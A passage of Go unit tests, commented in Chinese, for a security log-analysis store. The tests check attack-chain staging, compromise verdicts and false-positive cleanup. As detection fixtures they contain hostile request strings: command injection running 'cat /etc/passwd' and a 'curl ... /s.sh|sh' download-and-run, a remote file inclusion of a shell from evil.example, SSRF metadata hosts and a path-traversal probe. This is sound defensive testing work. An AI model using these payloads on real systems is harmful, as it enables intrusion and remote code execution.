package store

import (
	"fmt"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"netsa/internal/model"
)

// 生产环境的资产攻击链路里，大部分是自己的内网主机与数据中心公网地址：
//   - 内网主机定时连接云厂商接口（中危的规律外连）被标为“疑似失陷”；
//   - 内部漏洞扫描器、反向代理打出的大量连接被判为洪泛，记成扫描器自身的“横向”与被访问主机的“影响”；
//   - 互联网扫描源早期被误判的洪泛把自有公网地址推进到“影响”。
//
// 这些只是需核实的迹象：照常显示并注明原因，不计入阶段、推进深度与失陷研判。
func TestAssetChainWeakEvidence(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	fw := func(src, dst string, port int, outbound bool, h model.Hit) {
		s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: src, DstIP: dst, DstPort: port, Proto: "tcp", Action: model.ActionAllow, Outbound: outbound, Time: now}, []model.Hit{h})
	}
	// 1. 内网主机每 3 分钟连接云厂商接口
	fw("10.34.45.60", "140.205.162.5", 443, true, hit("bhv-beacon", CatBeacon, model.PhasePersistence, model.SevMedium, model.ResultAllowed))
	// 2. 内部漏洞扫描器对服务器 443 的大量连接（旧版本判为洪泛）
	fw("10.34.45.31", "10.34.44.88", 443, false, hit("bhv-flood", "洪水攻击", model.PhaseImpact, model.SevHigh, model.ResultAllowed))
	// 3. 互联网扫描源：先端口扫描，旧版本又判为洪泛
	fw("79.124.58.130", "10.34.44.90", 52950, false, hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevLow, model.ResultAllowed))
	fw("79.124.58.130", "10.34.44.90", 52951, false, hit("bhv-flood", "洪水攻击", model.PhaseImpact, model.SevHigh, model.ResultAllowed))
	// 4. 运维主机对内网的端口扫描（中危）
	fw("10.34.45.100", "10.34.44.91", 22, false, hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevMedium, model.ResultAllowed))

	l := s.ChainList(ChainQuery{})
	if l.Compromised["high"] != 0 || l.Compromised["medium"] != 0 {
		t.Fatalf("这些迹象都不应判为失陷: %v %+v", l.Compromised, l.Chains)
	}
	if n := l.Counts["control"] + l.Counts["lateral"] + l.Counts["impact"]; n != 0 {
		t.Fatalf("需核实的迹象不应计入阶段: %v", l.Counts)
	}
	// 连接量类命中不再记为发起方的横向（新数据不记录，旧数据查询时排除）
	if tr := s.chains[chainKey{"host", "10.34.45.31"}]; tr != nil {
		t.Fatalf("内部来源的洪泛不应记成它自己的横向: %+v", tr.Steps[0])
	}
	c := s.AssetChain("10.34.45.60")
	if c == nil || c.Confidence != "" || !slices.Contains(c.Weak, "control") || !strings.Contains(c.Verdict, "需核实") {
		t.Fatalf("只有规律外连：应注明需核实、不判为失陷: %+v", c)
	}
	if len(c.Steps) != 1 || c.Steps[0].Weak == "" || len(c.Path) != 0 {
		t.Fatalf("规律外连应照常显示并注明原因，不进入关键路径: %+v", c.Steps)
	}
	if !c.Stages[stControl].Weak || c.Stages[stControl].Reached {
		t.Fatalf("控制阶段应标为需核实而不是已到达: %+v", c.Stages[stControl])
	}
	for _, a := range c.Advice {
		if strings.Contains(a, "立即隔离") {
			t.Fatalf("只有需核实的迹象不应要求立即隔离: %v", c.Advice)
		}
	}
	if !slices.ContainsFunc(c.Advice, func(a string) bool { return strings.Contains(a, "需核实") && strings.Contains(a, "规律外连") }) {
		t.Fatalf("应给出核实建议: %v", c.Advice)
	}
	for _, id := range []string{"10.34.44.88", "10.34.44.90"} {
		c := s.AssetChain(id)
		if c == nil || slices.Contains(c.Reached, "impact") || !slices.Contains(c.Weak, "impact") {
			t.Fatalf("%s：内网来源与扫描源的“洪泛”不应推进到影响: %+v", id, c)
		}
	}
	if c := s.AssetChain("10.34.45.100"); c == nil || slices.Contains(c.Reached, "lateral") || !slices.Contains(c.Weak, "lateral") {
		t.Fatalf("内网中危扫描只是需核实的横向迹象: %+v", c)
	}

	// 真实的失陷迹象照常判定：同一主机命中高危的远控外连
	fw("10.34.45.60", "203.0.113.77", 443, true, hit("c2-egress", CatC2, model.PhasePersistence, model.SevCritical, model.ResultAllowed))
	if c := s.AssetChain("10.34.45.60"); c.Confidence != "high" || !slices.Contains(c.Reached, "control") {
		t.Fatalf("命中情报的外连应判为失陷: %+v", c.ChainSummary)
	}
	// 规律外连的对端正是远控地址：是佐证，不再是需核实的迹象
	fw("10.34.45.60", "203.0.113.77", 443, true, hit("bhv-beacon", CatBeacon, model.PhasePersistence, model.SevMedium, model.ResultAllowed))
	for _, v := range s.AssetChain("10.34.45.60").Steps {
		if v.Peer == "203.0.113.77" && v.Weak != "" {
			t.Fatalf("连接远控地址的规律外连不是需核实的迹象: %+v", v)
		}
	}
	// 大范围（高危）的内网扫描仍是横向
	fw("10.34.45.100", "10.34.44.92", 23, false, hit("bhv-portscan", "端口扫描", model.PhaseRecon, model.SevHigh, model.ResultAllowed))
	if c := s.AssetChain("10.34.45.100"); !slices.Contains(c.Reached, "lateral") {
		t.Fatalf("高危的内网扫描应计入横向: %+v", c.ChainSummary)
	}
}

// 扫描器把 OAST、nip.io、云元数据地址写进 Host 头：不是站点，记在实际收到请求的服务器上；旧版本按站点记录的不再列出。
func TestAssetChainFakeHost(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	for i, h := range []string{"aws.oast.online", "169.254.169.254.nip.io", "btjwyof9eg9c4bvk.invalid", "test.s3.amazonaws.com", "localhost", "169.254.169.254"} {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", DstIP: "10.34.44.88", Host: h, Method: "GET", URI: fmt.Sprintf("/latest/meta-data/%d", i),
			Status: 404, Time: now}, []model.Hit{hit("ssrf-metadata", "SSRF", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	}
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: "alibaba.oast.pro", Source: "nginx", Method: "GET", URI: "/", Status: 404, Time: now},
		[]model.Hit{hit("ssrf-metadata", "SSRF", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	// 旧版本记录的虚构站点
	s.mu.Lock()
	old := s.chainRolesOf(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: "x.example.com", URI: "/"})
	old.target.key = "dbmdin6cm7odcll7dhrg.oast.online"
	h := hit("dirscan", "目录扫描", model.PhaseRecon, model.SevLow, model.ResultFailed)
	s.chainHitLocked(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54"}, &h, &old, now, 0, 0)
	s.mu.Unlock()

	l := s.ChainList(ChainQuery{})
	var names []string
	for _, c := range l.Chains {
		names = append(names, c.Name)
	}
	if !slices.Contains(names, "10.34.44.88") || !slices.Contains(names, "日志源 nginx") || len(names) != 2 {
		t.Fatalf("虚构的 Host 头应记在服务器或日志源上: %v", names)
	}
	if l.Tracked != 2 {
		t.Fatalf("虚构站点不应计入资产数: %d", l.Tracked)
	}
	// 真实站点、内网主机名照常按站点记录
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: "mg-prd-nginx", Method: "GET", URI: "/x", Status: 404, Time: now},
		[]model.Hit{hit("ssrf-metadata", "SSRF", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	if s.AssetChain("mg-prd-nginx") == nil {
		t.Fatal("内网主机名是真实站点")
	}
}

// 站点首页按是否压缩、健康检查与浏览器访问有几种固定大小（均值与方差判断不了）：扫描器探测 /.env、/backup.sql 拿到的
// 首页不是敏感文件，不登记敏感入口、不判为攻击成功；旧版本误登记的在确认兜底页面后撤销，确认的大小随快照保存。
func TestCatchAllCommonHomeSizes(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site, scanner = "mg.example.com", "43.242.97.54"
	web := func(src, uri string, status int, bytes int64, hits ...model.Hit) {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: src, Host: site, Method: "GET", URI: uri, Status: status, Bytes: bytes, Time: now, UA: "Mozilla/5.0"}, hits)
	}
	sensHit := func(rule string) model.Hit {
		return hit(rule, "敏感文件探测", model.PhaseRecon, model.SevHigh, model.ResultSuccess)
	}
	// 旧版本：扫描开头的探测在认出兜底页面之前已被记为成功，Range 请求返回的 206 被登记成敏感入口
	web(scanner, "/.env", 200, 477, sensHit("sens-env"))
	web(scanner, "/backup.sql", 206, 477, sensHit("sens-backup"))
	s.mu.RLock()
	_, envEp := s.surf.Endpoints[site+" /.env"]
	_, sqlEp := s.surf.Endpoints[site+" /backup.sql"]
	s.mu.RUnlock()
	if !envEp || !sqlEp {
		t.Fatal("认出兜底页面之前，/.env 与 206 的 /backup.sql 按存在登记（模拟旧数据）")
	}
	if c := s.AssetChain(site); c == nil || !slices.Contains(c.Reached, "breach") {
		t.Fatalf("认出之前 /.env 的 200 记为突破: %+v", c)
	}
	// 正常访问：健康检查拿到 477 字节，浏览器拿到 2 万字节左右的首页（变异系数远超 10%）
	for i := range 200 {
		b := int64(477)
		if i%3 == 0 {
			b = 20000 + int64(i)
		}
		web(fmt.Sprintf("10.0.0.%d", i%50+1), "/", 200, b)
	}
	s.mu.RLock()
	home := s.surf.Endpoints[site+" /"]
	_, envEp = s.surf.Endpoints[site+" /.env"]
	_, sqlEp = s.surf.Endpoints[site+" /backup.sql"]
	fallback := s.surf.isFallback(site, 477)
	exposed := false
	for _, f := range s.surf.Findings {
		exposed = exposed || f.Category == "敏感资源暴露" || f.Category == "攻击成功研判"
	}
	s.mu.RUnlock()
	if home.baselineMatches(477) || !home.commonSize(477) || home.commonSize(20000) {
		t.Fatalf("首页基线波动大，应按常见大小识别 477: %+v", home.Sizes)
	}
	if !fallback || envEp || sqlEp || exposed {
		t.Fatalf("确认兜底页面后应撤销误登记的敏感入口与成功研判: fallback=%v env=%v sql=%v exposed=%v", fallback, envEp, sqlEp, exposed)
	}
	if c := s.AssetChain(site); slices.Contains(c.Reached, "breach") || !slices.Contains(c.Weak, "breach") || c.Confidence != "" {
		t.Fatalf("撤销后的“攻击成功”不应再算突破: %+v", c.ChainSummary)
	}
	if n := len(s.CompromisedAssets()); n != 0 {
		t.Fatalf("疑似失陷资产应同步撤销: %d", n)
	}

	// 快照恢复后，第一条探测即可认出兜底页面
	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	r.Record(&model.Event{Kind: model.KindWeb, SrcIP: scanner, Host: site, Method: "GET", URI: "/.git/HEAD", Status: 200, Bytes: 477, Time: now.Add(24 * time.Hour)},
		[]model.Hit{sensHit("sens-vcs")})
	r.mu.RLock()
	_, gitEp := r.surf.Endpoints[site+" /.git/head"]
	r.mu.RUnlock()
	if gitEp {
		t.Fatal("恢复后已确认的兜底页面大小应立即生效")
	}

	// 真实存在的敏感文件（大小不同）照常登记并报暴露
	r.Record(&model.Event{Kind: model.KindWeb, SrcIP: scanner, Host: site, Method: "GET", URI: "/config.bak", Status: 200, Bytes: 8123, Time: now.Add(24 * time.Hour)},
		[]model.Hit{sensHit("sens-backup")})
	r.mu.RLock()
	_, real := r.surf.Endpoints[site+" /config.bak"]
	r.mu.RUnlock()
	if !real {
		t.Fatal("真实的敏感文件应照常登记")
	}
}

// 旧版本登记的假敏感入口（没有记录响应大小）：再次被探测、响应是兜底页面时撤销。
func TestCatchAllRecheckLegacyEndpoint(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site = "www.example.com"
	s.mu.Lock()
	s.surf.Endpoints[site+" /db.sql"] = &Endpoint{Host: site, Path: "/db.sql", Methods: map[string]int{}, Status: map[int]int{206: 3}, Hits: 3, Attacks: 3,
		Sensitive: "备份/数据库文件可下载", atk: map[string]struct{}{}}
	s.surf.Findings["sens:"+site+" /.env"] = &Finding{ID: "sens:" + site + " /.env", Category: "敏感资源暴露", Evidence: "43.242.97.54 访问返回 200，响应 477 字节", Count: 2}
	s.surf.Endpoints[site+" /.env"] = &Endpoint{Host: site, Path: "/.env", Methods: map[string]int{}, Status: map[int]int{200: 2}, Hits: 2, Attacks: 2,
		Sensitive: "密钥/凭证文件可公开访问", atk: map[string]struct{}{}}
	s.surf.confirmFallback(site, 477)
	_, env := s.surf.Endpoints[site+" /.env"]
	_, envF := s.surf.Findings["sens:"+site+" /.env"]
	s.mu.Unlock()
	if env || envF {
		t.Fatal("证据文本中的响应大小是兜底页面：应撤销旧的敏感资源暴露与入口")
	}
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: site, Method: "GET", URI: "/db.sql", Status: 206, Bytes: 477, Time: now},
		[]model.Hit{hit("sens-backup", "敏感文件探测", model.PhaseRecon, model.SevHigh, model.ResultSuccess)})
	s.mu.RLock()
	_, db := s.surf.Endpoints[site+" /db.sql"]
	s.mu.RUnlock()
	if db {
		t.Fatal("旧的假敏感入口再次被探测、响应是兜底页面时应撤销")
	}
}

// 首页常见大小的统计：Space-Saving 替换进来的大小不会因为继承的计数被误判为常见。
func TestEndpointCommonSize(t *testing.T) {
	ep := &Endpoint{}
	for i := range 1000 {
		ep.noteSize(int64(10000 + i)) // 每次都不同的动态页面
	}
	for i := range 1000 {
		if ep.commonSize(int64(10000 + i)) {
			t.Fatalf("各不相同的大小不应被判为常见: %d %+v", 10000+i, ep.Sizes)
		}
	}
	became := false
	for range 30 {
		became = ep.noteSize(477) || became
	}
	if !became || !ep.commonSize(477) {
		t.Fatalf("反复出现的大小应成为常见大小: %+v", ep.Sizes)
	}
}

// 同一接口的攻击成功研判合并了多次命中：扫描器拿到兜底页面（同样大小）在前、真实利用拿到命令输出在后。
// 确认兜底页面后只撤销那部分，真实的成功仍在，链路中的突破照常计入。
func TestCatchAllKeepsRealSuccess(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site = "www.example.com"
	rce := func(src, uri string, bytes int64) {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: src, Host: site, Method: "GET", URI: uri, Status: 200, Bytes: bytes, Time: now},
			[]model.Hit{hit("cmd-inject", "命令/代码执行", model.PhaseExploit, model.SevHigh, model.ResultSuccess)})
	}
	rce("29.226.203.23", "/api/ping?host=127.0.0.1;cat%20/etc/passwd", 300) // 兜底页面
	rce("30.58.84.6", "/api/ping?host=127.0.0.1;curl%20-s%20http://203.0.113.77/s.sh%7Csh", 4821)
	// 其他路径也返回 300 字节：确认 300 是兜底页面
	rce("29.226.203.23", "/_ignition/execute-solution", 300)
	rce("29.226.203.23", "/wls-wsat/CoordinatorPortType", 300)
	rce("29.226.203.23", "/cgi-bin/.%2e/.%2e/bin/sh", 300)
	s.mu.RLock()
	f := s.surf.Findings["succ:命令/代码执行:"+site+" /api/ping"]
	s.mu.RUnlock()
	if f == nil || !slices.Equal(f.Sizes, []int64{4821}) {
		t.Fatalf("应只撤销兜底页面大小的命中，保留真实的成功: %+v", f)
	}
	c := s.AssetChain(site)
	real := false
	for _, v := range c.Steps {
		if v.Stage == "breach" && v.Src == "30.58.84.6" {
			real = v.Weak == ""
		}
	}
	if !real || !slices.Contains(c.Reached, "breach") {
		t.Fatalf("真实的命令注入成功应计入突破: %+v", c.Steps)
	}
}

// 越过侦察的攻击都来自内网地址（内部漏洞扫描器）：提示登记授权扫描；已有失陷迹象、或内网来源是横向移动时不提示。
func TestAssetChainInternalOnlyHint(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "10.34.45.31", Host: "mg.example.com", Method: "GET", URI: "/index.action?redirect:${x}", Status: 404, Time: now},
		[]model.Hit{hit("ognl", "表达式注入", model.PhaseExploit, model.SevHigh, model.ResultFailed)})
	c := s.AssetChain("mg.example.com")
	if c == nil || !c.InternalOnly || !strings.Contains(c.Verdict, "授权扫描") || !slices.ContainsFunc(c.Advice, func(a string) bool { return strings.Contains(a, "授权扫描") }) {
		t.Fatalf("只有内网来源的攻击应提示登记授权扫描: %+v", c)
	}
	// 失陷的服务器横向移动到另一台主机：不是内部扫描
	s.Record(&model.Event{Kind: model.KindFirewall, SrcIP: "10.0.0.10", DstIP: "10.0.0.31", DstPort: 445, Proto: "tcp", Action: model.ActionAllow, Time: now},
		[]model.Hit{hit("bhv-lateral-new", "横向移动", model.PhaseExploit, model.SevHigh, model.ResultAllowed)})
	if c := s.AssetChain("10.0.0.31"); c == nil || c.InternalOnly {
		t.Fatalf("横向移动不应提示登记授权扫描: %+v", c)
	}
}

// 旧版本把本站的 pdf 预览地址记成了远程文件包含（疑似失陷资产里一直留着一条）：快照恢复时撤销；真实的远程文件包含保留。
func TestPurgeSelfReferenceRFI(t *testing.T) {
	s := newTestStore()
	s.mu.Lock()
	s.surf.Findings["succ:目录穿越/文件包含:mg.example.com /static/pdf/web/viewer.html"] = &Finding{ID: "a", Title: "疑似攻击成功: 目录穿越/文件包含", Category: "攻击成功研判",
		Severity: model.SevHigh, Asset: "mg.example.com/static/pdf/web/viewer.html", Host: "mg.example.com", IPs: []string{"98.82.59.253"}, Count: 1,
		Evidence: "98.82.59.253 GET 返回 200，远程文件包含: /static/pdf/web/viewer.html?file=https://mg.example.com:443/group1/m00/0b/53/ciisd…"}
	s.surf.Findings["succ:目录穿越/文件包含:mg.example.com /x.php"] = &Finding{ID: "b", Title: "疑似攻击成功: 目录穿越/文件包含", Category: "攻击成功研判",
		Severity: model.SevHigh, Asset: "mg.example.com/x.php", Host: "mg.example.com", IPs: []string{"203.0.113.5"}, Count: 1,
		Evidence: "203.0.113.5 GET 返回 200，远程文件包含: /x.php?file=http://evil.example/shell.txt"}
	s.mu.Unlock()
	if n := len(s.CompromisedAssets()); n != 2 {
		t.Fatalf("准备数据: %d", n)
	}
	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	c := r.CompromisedAssets()
	if len(c) != 1 || !strings.Contains(c[0].Asset, "/x.php") {
		t.Fatalf("应只撤销指向本站的远程文件包含: %+v", c)
	}
}

// 旧版本把 SockJS 长连接的不断重连判为慢请求攻击，记进了站点的“影响”：查询时按需核实处理。
func TestAssetChainLongLivedTimeout(t *testing.T) {
	s := newTestStore()
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "60.2.41.105", Host: "mg.example.com", Method: "GET", URI: "/websocket/384/trcboqfg/websocket",
		Status: 200, Time: time.Now().Add(-time.Hour)}, []model.Hit{hit("bhv-timeout", "CC攻击", model.PhaseImpact, model.SevMedium, model.ResultUnknown)})
	c := s.AssetChain("mg.example.com")
	if c == nil || slices.Contains(c.Reached, "impact") || !slices.Contains(c.Weak, "impact") {
		t.Fatalf("长连接的“慢请求攻击”不应推进到影响: %+v", c)
	}
}

// 生产环境的旧数据：首页健康检查 479 字节，扫描器探测 /.env 拿到 477 字节（同一页面按请求头差了 2 字节），
// 旧版本没有记录响应大小，还把带 Range 头的 /db.sql、/backup.bak（206）登记成了敏感入口。
// 快照恢复时清理；真实存在的入口（302 跳转的后台、大小明显不同的备份文件）保留。
func TestCleanLegacyFallback(t *testing.T) {
	s := newTestStore()
	const site = "mg.example.com"
	s.mu.Lock()
	sf := s.surf
	home := &Endpoint{Host: site, Path: "/", Methods: map[string]int{}, Status: map[int]int{200: 200}, atk: map[string]struct{}{}}
	for i := range 200 {
		b := int64(479)
		if i%7 == 0 {
			b = 1286
		}
		home.observeNormal(b)
		home.noteSize(b)
	}
	sf.Endpoints[site+" /"] = home
	legacy := func(path string, status map[int]int, sens string) {
		n := 0
		for _, c := range status {
			n += c
		}
		sf.Endpoints[site+" "+path] = &Endpoint{Host: site, Path: path, Methods: map[string]int{}, Status: status, Hits: int64(n), Attacks: int64(n),
			Sensitive: sens, atk: map[string]struct{}{}}
	}
	legacy("/.env", map[int]int{200: 25}, "密钥/凭证文件可公开访问")
	legacy("/db.sql", map[int]int{200: 3, 206: 3}, "备份/数据库文件可下载")
	legacy("/backup.bak", map[int]int{206: 3}, "备份/数据库文件可下载")
	legacy("/config.bak", map[int]int{200: 2}, "备份/数据库文件可下载")
	legacy("/admin", map[int]int{302: 4}, "管理后台/运维入口对外暴露")
	sf.Findings["sens:"+site+" /.env"] = &Finding{ID: "sens:" + site + " /.env", Category: "敏感资源暴露", Evidence: "43.242.97.54 访问返回 200，响应 477 字节", Count: 2}
	sf.Findings["sens:"+site+" /config.bak"] = &Finding{ID: "sens:" + site + " /config.bak", Category: "敏感资源暴露", Evidence: "203.0.113.5 访问返回 200，响应 81230 字节", Count: 1}
	s.mu.Unlock()

	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	r.mu.RLock()
	defer r.mu.RUnlock()
	for _, p := range []string{"/.env", "/db.sql", "/backup.bak"} {
		if r.surf.Endpoints[site+" "+p] != nil {
			t.Errorf("%s 是兜底页面，应撤销", p)
		}
	}
	if r.surf.Findings["sens:"+site+" /.env"] != nil || !r.surf.isFallback(site, 477) {
		t.Error("证据中的 477 字节与首页 479 字节只差 2 字节：应撤销并记为兜底页面大小")
	}
	for _, p := range []string{"/config.bak", "/admin", "/"} {
		if r.surf.Endpoints[site+" "+p] == nil {
			t.Errorf("%s 确实存在，应保留", p)
		}
	}
	if r.surf.Findings["sens:"+site+" /config.bak"] == nil {
		t.Error("大小明显不同的备份文件是真实的暴露，应保留")
	}
}

// 运行中：2 个不同探测路径的大小完全相同、且与首页的常见大小只差几个字节，即认定为兜底页面（不必等 3 个）。
func TestCatchAllTwoPathsNearHome(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	const site = "mg.example.com"
	for i := range 60 { // 健康检查 479 字节，浏览器拿到 2 万字节左右的首页：均值与方差判断不了
		b := int64(479)
		if i%3 == 0 {
			b = 20000 + int64(i)
		}
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: fmt.Sprintf("10.0.0.%d", i%20+1), Host: site, Method: "GET", URI: "/", Status: 200, Bytes: b, Time: now, UA: "Mozilla/5.0"}, nil)
	}
	probe := func(uri string, bytes int64) {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: site, Method: "GET", URI: uri, Status: 200, Bytes: bytes, Time: now},
			[]model.Hit{hit("sens-secret", "敏感文件探测", model.PhaseRecon, model.SevHigh, model.ResultSuccess)})
	}
	probe("/.env", 477)
	probe("/.git/HEAD", 477)
	s.mu.RLock()
	defer s.mu.RUnlock()
	if !s.surf.isFallback(site, 477) || s.surf.Endpoints[site+" /.env"] != nil || s.surf.Findings["sens:"+site+" /.env"] != nil {
		t.Fatal("第二条同样大小、接近首页的探测应确认兜底页面，并撤销第一条")
	}
	// 只有一条接近首页大小的探测（可能是真实的小文件）：不判定
	if s.surf.catchAll(site, "/id_rsa", 482) {
		t.Fatal("单独一次接近首页大小不足以判定兜底页面")
	}
}

// 快照恢复时：旧版本只凭策略匹配日志记下的“防火墙管理服务对公网放行”（扫描器各探测一次）撤销，确有大量访问的保留；
// 规则收紧后，业务接口里带 console 的路径不再是管理后台。
func TestLoadPurgesDeviceAndReclassifies(t *testing.T) {
	s := newTestStore()
	s.mu.Lock()
	sf := s.surf
	for _, x := range []struct {
		key     string
		allowed int64
		sources int
		name    string
	}{{"43.242.97.48:830/tcp", 38, 30, "NETCONF"}, {"43.242.97.51:8080/tcp", 751, 144, "HTTP 管理"}, {"43.242.97.47:8080/tcp", 1926938, 133, "HTTP 管理"}} {
		sf.Services[x.key] = &Service{DstIP: strings.Split(x.key, ":")[0], Port: 1, Allowed: x.allowed, Sources: x.sources, Exposed: true, src: map[string]int32{}}
		sf.Findings["dev:"+x.key] = &Finding{ID: "dev:" + x.key, Title: "防火墙管理服务对公网放行: " + x.name, Category: "服务暴露", Severity: model.SevHigh, Asset: x.key,
			Evidence: "防火墙按策略「允许本地上外网.\x00」放行了来自公网 113.57.107.46 到设备自身（local 安全域）的连接"}
	}
	ep := &Endpoint{Host: "mg.example.com", Path: "/waterbuddy/api/console/push-messages", Methods: map[string]int{}, Status: map[int]int{200: 9}, NormN: 9,
		Sensitive: "管理后台/运维入口对外暴露", Severity: model.SevMedium, atk: map[string]struct{}{}}
	sf.Endpoints["mg.example.com /waterbuddy/api/console/push-messages"] = ep
	sf.Findings["sens:mg.example.com /waterbuddy/api/console/push-messages"] = &Finding{Category: "敏感资源暴露", Title: "管理后台/运维入口对外暴露"}
	nacos := &Endpoint{Host: "mg.example.com", Path: "/nacos/console", Methods: map[string]int{}, Status: map[int]int{200: 2}, NormN: 2,
		Sensitive: "管理后台/运维入口对外暴露", Severity: model.SevMedium, atk: map[string]struct{}{}}
	sf.Endpoints["mg.example.com /nacos/console"] = nacos
	s.mu.Unlock()

	path := filepath.Join(t.TempDir(), "state.json.gz")
	if err := s.Save(path); err != nil {
		t.Fatal(err)
	}
	r := newTestStore()
	if err := r.Load(path); err != nil {
		t.Fatal(err)
	}
	r.mu.RLock()
	defer r.mu.RUnlock()
	for _, k := range []string{"43.242.97.48:830/tcp", "43.242.97.51:8080/tcp"} {
		if r.surf.Findings["dev:"+k] != nil {
			t.Errorf("%s 只有扫描器的单次探测，应撤销", k)
		}
	}
	if f := r.surf.Findings["dev:43.242.97.47:8080/tcp"]; f == nil {
		t.Error("确有大量访问的设备服务应保留")
	} else if !strings.Contains(f.Evidence, "「允许本地上外网」") || strings.Contains(f.Evidence, "\x00") {
		t.Errorf("证据中的 NUL 应清理: %q", f.Evidence)
	}
	if e := r.surf.Endpoints["mg.example.com /waterbuddy/api/console/push-messages"]; e == nil || e.Sensitive != "" || r.surf.Findings["sens:mg.example.com /waterbuddy/api/console/push-messages"] != nil {
		t.Errorf("业务接口不是管理后台: %+v", e)
	}
	if e := r.surf.Endpoints["mg.example.com /nacos/console"]; e == nil || e.Sensitive == "" {
		t.Errorf("/nacos/console 仍是管理后台: %+v", e)
	}
}

// 边界防护的结论按服务归并，不重复列出同一服务。
func TestPerimeterSummaryDedup(t *testing.T) {
	d := &assessData{totals: Totals{Firewall: 10}}
	for _, ip := range []string{"10.0.0.1", "10.0.0.2", "10.0.0.3"} {
		d.services = append(d.services, &Service{DstIP: ip, Port: 873, Name: "Rsync", Risk: model.SevHigh, Exposed: true})
	}
	d.services = append(d.services, &Service{DstIP: "10.0.0.9", Port: 3306, Name: "MySQL", Risk: model.SevHigh, Exposed: true})
	dim := d.perimeter()
	if strings.Count(dim.Summary, "Rsync") != 1 || !strings.Contains(dim.Summary, "Rsync(873) ×3 台") || !strings.Contains(dim.Summary, "MySQL(3306)") {
		t.Fatalf("应按服务归并: %s", dim.Summary)
	}
}

// 旧版本把正常 Web 客户端（NAT 后的大量用户、不断重连的长连接）的防火墙连接判为洪泛：查询时按需核实处理。
// 线上旧数据：一台手机上的 App 反复加载 H5 页面，旧版本只按请求数判为高危 CC，把站点推进到“影响”。
// 停在静态资源上的旧 CC 步骤与新版本的低危页面加载都只是需核实的迹象；反复请求接口的 CC 照常计入。
func TestAssetChainPageLoadCC(t *testing.T) {
	s := newTestStore()
	now := time.Now().Add(-time.Hour)
	for i := range 80 {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "14.31.64.16", Host: "mg.example.com", Method: "GET", URI: fmt.Sprintf("/platform-h5/static/js/c%d.js", i),
			Status: 200, Time: now}, nil)
	}
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "14.31.64.16", Host: "mg.example.com", Method: "GET", URI: "/platform-h5/static/js/index-b35b8665.js",
		Status: 200, Time: now}, []model.Hit{hit("bhv-cc", "CC攻击", model.PhaseImpact, model.SevHigh, model.ResultUnknown)})
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "36.1.2.3", Host: "app.example.com", Method: "GET", URI: "/platform-h5/favicon.png",
		Status: 200, Time: now}, []model.Hit{weakHit(hit("bhv-cc", "CC攻击", model.PhaseImpact, model.SevLow, model.ResultUnknown))})
	for i := range 80 {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.77", Host: "api.example.com", Method: "GET", URI: fmt.Sprintf("/search?q=%d", i),
			Status: 200, Time: now}, nil)
	}
	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.77", Host: "api.example.com", Method: "GET", URI: "/search?q=x",
		Status: 200, Time: now}, []model.Hit{hit("bhv-cc", "CC攻击", model.PhaseImpact, model.SevHigh, model.ResultUnknown)})
	for _, site := range []string{"mg.example.com", "app.example.com"} {
		if c := s.AssetChain(site); c == nil || slices.Contains(c.Reached, "impact") || !slices.Contains(c.Weak, "impact") {
			t.Fatalf("%s: 页面资源加载的高频请求不应推进到影响: %+v", site, c)
		}
	}
	if c := s.AssetChain("api.example.com"); c == nil || !slices.Contains(c.Reached, "impact") {
		t.Fatalf("反复请求接口的 CC 照常计入影响: %+v", c)
	}
}

// 线上实例：扫描器把 OAST 子域名、Nuclei 的随机串域名（3lbsitxdhywmaerqm5xkm6tq59q.tld）写进 Host 头，
// 攻击面的“识别到的站点”列出了几十个不存在的站点。新请求不再按这些 Host 登记，旧记录在快照恢复时删除。
func TestSurfaceFakeHosts(t *testing.T) {
	s := newTestStore()
	now := time.Now()
	for _, h := range []string{"mg.example.com", "3lbsitxdhywmaerqm5xkm6tq59q.tld", "dbl3cmucm7o151m1ko0093sf1duw8h8zg.oast.fun"} {
		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "198.51.100.5", Host: h, Method: "GET", URI: "/index.php", Status: 200, Time: now}, nil)
	}
	s.mu.Lock()
